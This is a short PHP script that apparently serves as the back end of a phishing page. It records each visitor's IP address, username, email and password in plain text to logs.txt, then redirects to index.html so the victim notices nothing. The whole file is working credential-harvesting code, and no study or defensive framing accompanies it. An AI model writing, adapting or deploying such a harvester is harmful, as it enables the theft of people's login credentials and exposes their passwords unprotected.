<?php
$logfile = "logs.txt";

// Get user's IP
$ip = $_SERVER['REMOTE_ADDR'];

// Capture input
$username = $_POST['username'] ?? 'N/A';
$email = $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';

// Format log entry
$data = "IP: $ip | Name: $username | Email: $email | Pass: $password\n";

// Append data to logs.txt
file_put_contents($logfile, $data, FILE_APPEND);

// Redirect back to the main page
header("Location: index.html");
exit();
?>
